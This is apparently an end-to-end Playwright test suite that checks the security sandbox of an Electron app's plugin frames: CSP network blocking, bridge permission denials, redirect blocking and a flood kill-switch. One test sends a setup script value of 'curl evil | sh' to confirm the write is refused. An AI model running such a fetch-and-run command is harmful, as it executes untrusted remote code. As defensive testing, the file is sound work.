import { expect, test, _electron as electron, type ElectronApplication, type Frame, type Page } from '@playwright/test'
import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { PLUGIN_API_MAJOR } from '@acorn/protocol/api.ts'

// The security acceptance checklist for docs/plugins.md, as assertions rather
// than as a list someone re-reads before a release.
//
// Every item here is a property of the frame that only exists at runtime: a CSP is a header until a
// request is made against it, `window.acorn` is absent only if the preload really did not run in the
// subframe, and "the request never reaches nodeFetch" is a claim about a code path unit tests can stub
// away. So this suite drives a real plugin, in a real frame, on a real origin.
//
// The plugin is installed on the LOCAL node rather than a paired one. The two-node distribution path is
// already the phase-2 test's job (twoNode.spec.ts); what is under test here is what happens once bytes
// are trusted, and pairing would add ninety seconds and a second process to every assertion.

const KEY = 'e'.repeat(64)
const PLUGIN_ID = 'e2e-widget'
const PANE_ID = 'e2e-widget'

const roots: string[] = []
const apps: ElectronApplication[] = []

// The demo plugin's client bundle. Hand-written ESM with the handshake inlined, because the fixture must
// not depend on a bundler run: @acorn/plugin-api/ui/sdk is what a real plugin imports, and its own suite
// covers it against a fake port. What this file needs is a frame that answers a test's questions.
const CLIENT_BUNDLE = `
const pending = new Map()
let port = null
let seq = 0
let declaredClaims = new Set()

window.addEventListener('message', (event) => {
  if (!event.data || event.data.acornBridge !== 1) return
  port = event.ports[0]
  port.onmessage = (e) => {
    const message = e.data
    if (message && typeof message.id === 'number') {
      const waiting = pending.get(message.id)
      pending.delete(message.id)
      if (waiting) waiting(message)
      return
    }
    if (!message) return
    if (message.kind === 'ready') {
      window.__context = message.context
      declaredClaims = new Set(message.context.claimsKeys || [])
      document.body.dataset.ready = '1'
    }
    if (message.kind === 'appearance') {
      window.__appearance = message
      document.documentElement.dataset.theme = message.theme
      document.documentElement.dataset.style = message.style
    }
    if (message.kind === 'event') (window.__events = window.__events || []).push(message)
  }
  if (port.start) port.start()
})

window.__send = (message) => new Promise((resolve) => {
  const id = ++seq
  pending.set(id, resolve)
  port.postMessage({ ...message, id })
})

// Fire-and-forget, for the flood test: awaiting a reply that the rate limiter will never send would just
// hang the test instead of proving anything.
window.__spam = (count) => {
  for (let i = 0; i < count; i++) port.postMessage({ id: ++seq, kind: 'ui', op: 'copy', text: 'x' })
}

const chord = (event) => {
  let value = ''
  if (event.metaKey) value += 'meta+'
  if (event.ctrlKey) value += 'ctrl+'
  if (event.altKey) value += 'alt+'
  if (event.shiftKey) value += 'shift+'
  const key = event.code.startsWith('Key') ? event.code.slice(3).toLowerCase() : event.key.toLowerCase()
  return value + key
}

window.addEventListener('keydown', (event) => {
  const value = chord(event)
  if (declaredClaims.has(value)) {
    window.__claimed = (window.__claimed || 0) + 1
    return
  }
  event.preventDefault()
  port.postMessage({ kind: 'keydown', chord: value })
}, { capture: true })

const marker = document.createElement('div')
marker.id = 'widget-marker'
marker.textContent = 'e2e widget pane'
document.body.appendChild(marker)
`

// Written straight to disk. The node reads its plugins directory once, at start-up, so this has to happen
// before the app launches.
function installPlugin(dataDir: string, webviewUrl?: string): void {
  const dir = join(dataDir, 'plugins', PLUGIN_ID)
  mkdirSync(join(dir, 'dist'), { recursive: true })
  writeFileSync(join(dir, 'dist', 'client.js'), CLIENT_BUNDLE)
  writeFileSync(join(dir, 'acorn-plugin.json'), JSON.stringify({
    id: PLUGIN_ID,
    name: 'E2E widget',
    version: '1.4.0',
    apiVersion: PLUGIN_API_MAJOR,
    client: './dist/client.js',
    // `core.projects:write` is declared ON PURPOSE and is the point of two assertions below: a frame that
    // legitimately holds it must still be refused the project-config writes, because those are shell
    // commands the node executes.
    permissions: {
      api: ['core.tasks:read', 'core.projects:read', 'core.projects:write'],
      events: ['runtime:task-archived'],
    },
    // order 0 makes it the first pane in the switcher, so a task with no persisted layout renders it by
    // default and the test does not have to drive the pane UI to get a frame on screen.
    contributions: {
      frames: [
        { target: 'pane', id: PANE_ID, label: 'E2E widget', order: 0, claimsKeys: ['meta+f'] },
        { target: 'pane', id: 'e2e-widget-target', label: 'E2E target', order: 99 },
        ...(webviewUrl ? [{ target: 'webview', id: 'e2e-docs', label: 'E2E docs', order: 1, url: webviewUrl, hosts: ['localhost'] }] : []),
      ],
      commands: [{ id: 'open-target', title: 'Open E2E target', palette: false, action: { verb: 'openPane', pane: 'e2e-widget-target' } }],
      keybindings: [{ command: 'open-target', defaultChord: 'meta+alt+y', when: 'surface', surface: PANE_ID }],
      contentLinks: [{
        id: 'e2e-widget.item',
        match: 'https://board.example/items/{item}',
        openPane: PANE_ID,
        item: 'item',
      }],
    },
  }))
}

type PageBridge = {
  nodeFetch(nodeId: string, request: Record<string, unknown>): Promise<{ status: number; body: Uint8Array }>
  fleetList(): Promise<{ nodes: { nodeId: string; local: boolean }[] }>
}
type BridgeWindow = Window & { acorn?: PageBridge }

async function nodeJson<T>(page: Page, path: string, init: { method?: string; body?: unknown } = {}): Promise<T> {
  return page.evaluate(async ({ path, method, body }) => {
    const bridge = (window as BridgeWindow).acorn
    if (!bridge) throw new Error('The node broker bridge is missing.')
    const fleet = await bridge.fleetList()
    const node = fleet.nodes.find((candidate) => candidate.local) ?? fleet.nodes[0]
    if (!node) throw new Error('The fleet is empty — main never adopted the local node.')
    const res = await bridge.nodeFetch(node.nodeId, {
      requestId: `e2e-${Math.random().toString(36).slice(2)}`,
      path,
      method: method ?? 'GET',
      headers: body === undefined ? {} : { 'content-type': 'application/json' },
      ...(body === undefined ? {} : { body: { kind: 'bytes', bytes: new TextEncoder().encode(JSON.stringify(body)) } }),
    })
    const text = new TextDecoder().decode(res.body)
    if (res.status < 200 || res.status >= 300) throw new Error(`${path}: ${res.status} ${text}`)
    return (text ? JSON.parse(text) : undefined) as T
  }, { path, method: init.method, body: init.body })
}

type Running = { app: ElectronApplication; page: Page; dataDir: string; repoDir: string }

async function launch(webviewUrl?: string): Promise<Running> {
  const root = mkdtempSync(join(tmpdir(), 'acorn-plugin-frame-'))
  roots.push(root)
  const dataDir = join(root, 'data')
  const repoDir = join(root, 'repo')
  execFileSync('git', ['init', '-q', repoDir])
  execFileSync('git', ['-C', repoDir, 'config', 'user.email', 'e2e@acorn.test'])
  execFileSync('git', ['-C', repoDir, 'config', 'user.name', 'Acorn E2E'])
  execFileSync('git', ['-C', repoDir, 'commit', '--allow-empty', '-qm', 'init'])
  installPlugin(dataDir, webviewUrl)

  const app = await electron.launch({
    args: ['out/main/index.js', `--user-data-dir=${join(dataDir, 'chromium')}`],
    env: {
      ...process.env,
      ACORN_E2E: '1',
      ACORN_E2E_DATA_DIR: dataDir,
      SESSION_ENC_KEY: KEY,
      GITHUB_CLIENT_ID: 'e2e-client',
      GITHUB_CLIENT_SECRET: 'e2e-secret',
    },
  })
  apps.push(app)
  app.process().stderr?.on('data', (chunk: Buffer) => console.error(`[main] ${chunk.toString().trimEnd()}`))
  const page = await app.firstWindow()
  page.on('pageerror', (error) => console.error(`[pageerror] ${error.message}`))
  await expect(page.locator('.shell')).toBeVisible()
  return { app, page, dataDir, repoDir }
}

const dismissOnboarding = async (page: Page): Promise<void> => {
  // These fixtures are first-run nodes — zero projects — so the wizard legitimately opens over them.
  // It is not what any of this suite tests, and once a security prompt stacks on top of it a click on
  // its own button can no longer land. So record the preference on the node, which survives the
  // reloads these specs do, and close the wizard directly if it has already painted.
  await page.evaluate(async () => {
    const bridge = (window as BridgeWindow).acorn
    if (!bridge) return
    const fleet = await bridge.fleetList()
    const node = fleet.nodes.find((candidate) => candidate.local) ?? fleet.nodes[0]
    if (!node) return
    await bridge.nodeFetch(node.nodeId, {
      requestId: `e2e-onboarded-${Math.random().toString(36).slice(2)}`,
      path: '/v2/core/prefs',
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: { kind: 'bytes', bytes: new TextEncoder().encode(JSON.stringify({ key: 'onboarded', value: '1' })) },
    })
  })
  // Best-effort: a plugin-trust prompt is modal and paints above the wizard, so until the spec answers
  // it this click cannot land. The preference above is what actually settles it — this is only here to
  // close a wizard that is already reachable.
  const skip = page.getByRole('button', { name: 'skip for now' })
  if (await skip.isVisible().catch(() => false)) await skip.click({ timeout: 5_000 }).catch(() => {})
}

// Nothing in this suite may click a rail row while a modal backdrop is still up, and after a reload the
// onboarding wizard can mount a beat later than `.shell` does — so dismissing once races it. Poll instead,
// and let the count assertion name whichever overlay refused to go. The wizard is a full-screen takeover
// with its own backdrop class, so both are counted.
const settleOverlays = async (page: Page): Promise<void> => {
  await expect
    .poll(async () => {
      await dismissOnboarding(page)
      return page.locator('.overlay-backdrop, .wizard-backdrop').count()
    }, { timeout: 30_000 })
    .toBe(0)
}

// Boot, trust the plugin, put a task on screen, and hand back the plugin's frame.
async function openPluginPane(webviewUrl?: string): Promise<Running & { frame: Frame; taskId: string }> {
  const running = await launch(webviewUrl)
  await dismissOnboarding(running.page)

  // Trust first: an unacknowledged bundle contributes nothing, so without this there is no pane to open.
  const dialog = running.page.locator('.plugin-trust-dialog')
  await expect(dialog).toBeVisible({ timeout: 60_000 })
  await expect(dialog).toContainText('Handle ⌘F in the "E2E widget" surface')
  if (webviewUrl) {
    await expect(dialog.getByRole('heading', { name: 'Shows web pages — enforced hosts, live network' })).toBeVisible()
    await expect(dialog).toContainText('Show web pages from localhost in the "E2E docs" pane')
    await expect(dialog).toContainText('Pages load from the internet with their own cookies and logins.')
  }
  await dialog.getByRole('button', { name: 'Trust this plugin' }).click()
  await expect(dialog).toHaveCount(0)

  const workspace = await nodeJson<{ id: string }>(running.page, '/v2/core/workspaces', { method: 'POST', body: { name: 'Frames' } })
  const project = await nodeJson<{ project: { id: string } }>(running.page, '/v2/core/projects', {
    method: 'POST', body: { path: running.repoDir, workspaceId: workspace.id },
  })
  const task = await nodeJson<{ id: string }>(running.page, '/v2/core/tasks', {
    method: 'POST', body: { origin: 'local', projectId: project.project.id, branch: 'main', title: 'Frame task' },
  })

  // Navigate, then reload so the task view starts from SQLite rather than the pre-seed in-memory cache,
  // then click the rail row: the route alone leaves the shell on Home, because task selection is the
  // rail's business and a deep link is restored rather than obeyed.
  await running.page.goto(new URL(`/t/${task.id}`, running.page.url()).toString())
  await running.page.reload()
  await expect(running.page.locator('.shell')).toBeVisible()
  await settleOverlays(running.page)
  await running.page.getByText('Frame task').first().click()

  // The pane slot carries the contribution id, so this asserts the adapter registered under the manifest's
  // own id and nothing else.
  const slot = running.page.locator(`[data-pane-id="${PANE_ID}"]`)
  await expect(slot).toBeVisible({ timeout: 30_000 })
  const iframe = slot.locator('iframe')
  await expect(iframe).toHaveAttribute('src', /^app-plugin:\/\/[0-9a-f]{64}\/index\.html$/)
  // Defence in depth on top of the separate origin: no popups, no top-level navigation, no forms, no
  // downloads. `allow-same-origin` keeps the hash origin, which is what the served CSP's `'self'` means —
  // PluginFrame.tsx has the full argument for why the pair is safe here.
  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts allow-same-origin')

  const pluginFrame = () => running.page.frames().find((candidate) => candidate.url().startsWith('app-plugin://'))
  await expect.poll(() => pluginFrame() !== undefined, { timeout: 30_000 }).toBe(true)
  const frame = pluginFrame()!

  // The bundle really ran, and the handshake really landed.
  await expect(frame.locator('#widget-marker')).toHaveText('e2e widget pane')
  await expect.poll(() => frame.evaluate(() => document.body.dataset.ready), { timeout: 15_000 }).toBe('1')

  return { ...running, frame, taskId: task.id }
}

type Reply = { ok: boolean; status?: number; body?: unknown; error?: { code: string; message: string } }

const send = (frame: Frame, message: Record<string, unknown>): Promise<Reply> =>
  frame.evaluate((m) => (window as unknown as { __send(x: unknown): Promise<Reply> }).__send(m), message)

test.afterEach(async () => {
  for (const app of apps.splice(0)) await app.close().catch(() => {})
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true })
})

// oxlint-disable-next-line no-empty-pattern -- Playwright requires an object pattern for unused fixtures.
test('a plugin webview renders allowed content and blocks an outside-host redirect', async ({}, testInfo) => {
  test.setTimeout(180_000)
  const server = createServer((request, response) => {
    if (request.url === '/redirect') {
      const port = (server.address() as { port: number }).port
      response.writeHead(302, { location: `http://127.0.0.1:${port}/outside` })
      response.end()
      return
    }
    response.writeHead(200, { 'content-type': 'text/html' })
    response.end('<main>PLUGIN_WEBVIEW_OK</main>')
  })
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()))
  const port = (server.address() as { port: number }).port
  try {
    const running = await openPluginPane(`http://localhost:${port}/ok`)
    await running.page.getByRole('button', { name: 'E2E docs' }).click()
    const slot = running.page.locator('[data-pane-id="e2e-docs"]')
    await expect(slot).toBeVisible()
    await expect(slot.locator('.plugin-webview-hostname')).toHaveText(`localhost:${port}`)

    const rendered = await running.app.evaluate(async ({ webContents }, expectedPort) => {
      const deadline = Date.now() + 20_000
      while (Date.now() < deadline) {
        const view = webContents.getAllWebContents().find((contents) => contents.getURL().includes(`localhost:${expectedPort}/ok`))
        if (view && !view.isLoading()) return view.executeJavaScript('document.body.innerText') as Promise<string>
        await new Promise((resolve) => setTimeout(resolve, 100))
      }
      return '(webview did not render)'
    }, port)
    expect(rendered.trim()).toBe('PLUGIN_WEBVIEW_OK')
    await running.page.screenshot({ path: testInfo.outputPath('plugin-webview.png') })

    const controller = () => running.page.frames().find((frame) =>
      frame.url().startsWith('app-plugin://') && frame !== running.frame,
    ) ?? running.page.frames().find((frame) => frame.url().startsWith('app-plugin://'))
    await expect.poll(() => controller()?.evaluate(() => document.body.dataset.ready), { timeout: 15_000 }).toBe('1')
    const reply = await send(controller()!, {
      kind: 'webview', op: 'navigate', url: `http://localhost:${port}/redirect`,
    })
    expect(reply.ok).toBe(true)
    await expect(slot.locator('.plugin-webview-blocked')).toContainText('127.0.0.1')
    await expect.poll(
      () => controller()!.evaluate(() => (window as unknown as { __events?: { channel: string }[] }).__events?.some((event) => event.channel === 'webview:blocked')),
      { timeout: 15_000 },
    ).toBe(true)
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()))
  }
})

test('shell and plugin shortcuts cross a focused plugin frame', async () => {
  test.setTimeout(180_000)
  const { page, frame } = await openPluginPane()
  await frame.locator('#widget-marker').click()

  await page.keyboard.press('Meta+k')
  await expect(page.locator('.palette')).toBeVisible({ timeout: 15_000 })
  await page.keyboard.press('Escape')

  await frame.locator('#widget-marker').click()
  await page.keyboard.press('Meta+f')
  await expect.poll(() => frame.evaluate(() => (window as unknown as { __claimed?: number }).__claimed ?? 0)).toBe(1)

  await frame.locator('#widget-marker').click()
  await page.keyboard.press('Meta+Alt+y')
  await expect(page.locator('[data-pane-id="e2e-widget-target"]')).toBeVisible({ timeout: 15_000 })
})

test('a plugin frame can reach nothing on this machine but its own bridge', async () => {
  test.setTimeout(180_000)
  const { page, frame, taskId } = await openPluginPane()

  // ── The frame is not in the shell's realm ───────────────────────────────────────────────────────
  // `window.acorn`, and with it every token-bearing call, does not exist here: the preload runs in the
  // top frame only, because nodeIntegrationInSubFrames is at its default. That default is load-bearing
  // and this is the assertion that notices if it ever changes.
  expect(await frame.evaluate(() => typeof (window as { acorn?: unknown }).acorn)).toBe('undefined')

  // Cross-origin, so the parent's DOM is unreachable. A string rather than a boolean so a failure names
  // what came back instead of just being `false`.
  expect(
    await frame.evaluate(() => {
      try {
        return String(window.parent.document.title)
      } catch (error) {
        return `threw: ${(error as Error).name}`
      }
    }),
  ).toMatch(/^threw:/)

  // ── No network at all ──────────────────────────────────────────────────────────────────────────
  // Not a restricted network — none. `connect-src 'none'` means a malicious bundle cannot exfiltrate
  // what it sees even to its own server.
  //
  // Asserted on the CSP violation reports rather than on whether each call "failed". A hostname that does
  // not resolve fails for every API here whatever the policy says, so a passing catch-block would prove
  // only that DNS works — the violation event is the one signal that names the policy as the reason.
  const network = await frame.evaluate(async () => {
    const violations: string[] = []
    document.addEventListener('securitypolicyviolation', (event) => {
      violations.push(`${event.effectiveDirective || event.violatedDirective}`)
    })
    const target = 'https://acorn-e2e-blocked.invalid/x'
    const swallow = async (attempt: () => unknown) => {
      try {
        await attempt()
      } catch {
        // The refusal shape differs per API — thrown here, an error event there. The violation list is
        // what this measures.
      }
    }
    await swallow(() => fetch(target))
    await swallow(() => {
      const request = new XMLHttpRequest()
      request.open('GET', target, true)
      request.send()
    })
    await swallow(() => new WebSocket('wss://acorn-e2e-blocked.invalid/x'))
    await swallow(() => new EventSource(target))
    // Its return value is deliberately not asserted on: Chromium answers `true` (queued) and enforces the
    // policy afterwards, so the violation below is the only honest evidence either way.
    navigator.sendBeacon(target)
    await new Promise((resolve) => setTimeout(resolve, 500))
    return violations
  })
  // One per attempt — fetch, XHR, WebSocket, EventSource, sendBeacon — and every one names connect-src.
  expect(network.length).toBeGreaterThanOrEqual(5)
  expect([...new Set(network)]).toEqual(['connect-src'])

  // ── The bridge is the only door, and it checks the manifest ─────────────────────────────────────
  const allowed = await send(frame, { kind: 'api', method: 'GET', path: '/v2/core/tasks' })
  expect(allowed.ok).toBe(true)
  expect((allowed.body as { id: string }[]).map((row) => row.id)).toContain(taskId)

  for (const path of ['/v2/core/security', '/v2/core/prefs', '/v2/core/devices', '/v2/core/audit', '/v2/p/github/pulls']) {
    const denied = await send(frame, { kind: 'api', method: 'GET', path })
    expect(denied.ok, `${path} should be denied`).toBe(false)
    expect(denied.error?.code).toBe('plugin_scope_denied')
  }

  // The code-execution path, tested directly rather than trusted to the scope table: these two writes are
  // shell commands the node runs on the next task, and this frame legitimately holds core.projects:write.
  const projects = await send(frame, { kind: 'api', method: 'GET', path: '/v2/core/projects' })
  const projectId = (projects.body as { projects: { id: string }[] }).projects[0].id
  for (const path of [`/v2/core/projects/${projectId}/config`, `/v2/core/projects/${projectId}/run-targets`]) {
    const denied = await send(frame, { kind: 'api', method: 'PUT', path, body: { patch: { setup_script: 'curl evil | sh' } } })
    expect(denied.ok, `${path} must never be writable from a frame`).toBe(false)
    expect(denied.error?.code).toBe('plugin_scope_denied')
  }
  // And the node did not execute it: the config is unchanged, which is the assertion that would fail if
  // the denial happened after the forward rather than before it.
  const config = await nodeJson<{ config: Record<string, unknown> }>(page, `/v2/core/projects/${projectId}/config`)
  expect(JSON.stringify(config)).not.toContain('curl evil')

  // ── The frame cannot address another node ──────────────────────────────────────────────────────
  // There is no node parameter in the protocol, so the only way to try is to invent one. It is ignored:
  // the request still goes to the node the host pinned at frame creation.
  const smuggled = await send(frame, { kind: 'api', method: 'GET', path: '/v2/core/tasks', nodeId: 'not-a-node' })
  expect(smuggled.ok).toBe(true)
  expect((smuggled.body as { id: string }[]).map((row) => row.id)).toContain(taskId)

  // ── Verbs are scoped to the surface ───────────────────────────────────────────────────────────
  for (const op of ['importer.done', 'importer.close']) {
    const denied = await send(frame, { kind: 'ui', op })
    expect(denied.ok, `${op} from a pane should be denied`).toBe(false)
    expect(denied.error?.code).toBe('plugin_scope_denied')
  }
  // Own panes only, and `pr` is first-party.
  expect((await send(frame, { kind: 'ui', op: 'openPane', paneId: 'pr' })).error?.code).toBe('plugin_scope_denied')
  expect((await send(frame, { kind: 'ui', op: 'openPane', paneId: PANE_ID })).ok).toBe(true)
  // Nothing outside the closed set, however plausible it looks.
  expect((await send(frame, { kind: 'ui', op: 'eval', code: '1' })).ok).toBe(false)

  // Events: the declared channel attaches, an undeclared one does not.
  expect((await send(frame, { kind: 'subscribe', channel: 'runtime:task-archived' })).ok).toBe(true)
  expect((await send(frame, { kind: 'subscribe', channel: 'presentation:open-settings' })).error?.code).toBe('plugin_scope_denied')

  // State is namespaced by the host, so a plugin cannot read or overwrite another's.
  expect((await send(frame, { kind: 'state.set', key: 'columns', value: [1, 2] })).ok).toBe(true)
  expect((await send(frame, { kind: 'state.get', key: 'columns' })).body).toEqual([1, 2])

  // window.open is denied outright, so the frame gets null back.
  expect(await frame.evaluate(() => window.open('https://example.test/') === null)).toBe(true)

  // ── Appearance follows the host, on both axes ──────────────────────────────────────────────────
  const pushed = await frame.evaluate(() => (window as unknown as { __appearance: { theme: string; style: string; tokens: Record<string, string> } }).__appearance)
  expect(pushed.tokens['--bg']).toMatch(/\S/)
  await page.evaluate(() => {
    document.documentElement.dataset.theme = 'nord'
    document.documentElement.dataset.style = 'modern'
  })
  await expect
    .poll(() => frame.evaluate(() => [document.documentElement.dataset.theme, document.documentElement.dataset.style]), { timeout: 10_000 })
    .toEqual(['nord', 'modern'])

  // ── Declarative content links ──────────────────────────────────────────────────────────────────
  // Recognition is manifest data interpreted by the host. Put one of the declared URLs through a
  // real shell markdown surface: clicking it must select the plugin pane rather than leave the app.
  await page.getByRole('button', { name: 'Notes' }).click()
  const editor = page.locator('.notes-editor')
  await expect(editor).toBeVisible()
  await editor.fill('[Open card 42](https://board.example/items/card-42)')
  // The first edit materializes the virtual scratchpad asynchronously. Let that settle before
  // toggling preview, otherwise the note-list refetch can finish after the click and reopen edit mode.
  await expect(page.locator('.notes-save-state')).toContainText('saved', { timeout: 15_000 })
  await page.getByRole('button', { name: 'Preview', exact: true }).click()
  await expect(page.locator('.notes-preview')).toBeVisible()
  await page.getByRole('link', { name: 'Open card 42' }).click()
  await expect(page.locator(`[data-pane-id="${PANE_ID}"]`)).toBeVisible()

  // ── Top-level navigation, last ─────────────────────────────────────────────────────────────────
  // The shell's window may only ever sit on app://acorn, so a plugin bundle can never become the whole
  // window. Left until the end deliberately: main PREVENTS the navigation rather than completing it, which
  // leaves this page with a navigation Playwright waits forever to finish, so nothing may follow it.
  const before = page.url()
  await page.evaluate(() => {
    window.location.href = 'app-plugin://' + 'a'.repeat(64) + '/index.html'
  })
  await page.waitForTimeout(1000)
  expect(page.url()).toBe(before)
})

// Its own test because the kill switch is terminal: once the port is dropped the frame is a placeholder,
// and nothing after it in the checklist would be measuring what it claims to.
test('a frame that floods the bridge loses it, and the shell stays responsive', async () => {
  test.setTimeout(180_000)
  const { page, frame } = await openPluginPane()

  await frame.evaluate(() => (window as unknown as { __spam(n: number): void }).__spam(1500))

  await expect(page.locator(`[data-pane-id="${PANE_ID}"]`).getByText('Plugin misbehaving')).toBeVisible({ timeout: 20_000 })
  // The frame is gone, not merely muted.
  await expect(page.locator(`[data-pane-id="${PANE_ID}"] iframe`)).toHaveCount(0)
  // And the shell it was flooding still works: the pane switcher still answers, and a node round trip
  // still completes.
  await expect(page.locator('.shell')).toBeVisible()
  expect((await nodeJson<{ id: string }[]>(page, '/v2/core/tasks')).length).toBeGreaterThan(0)
})
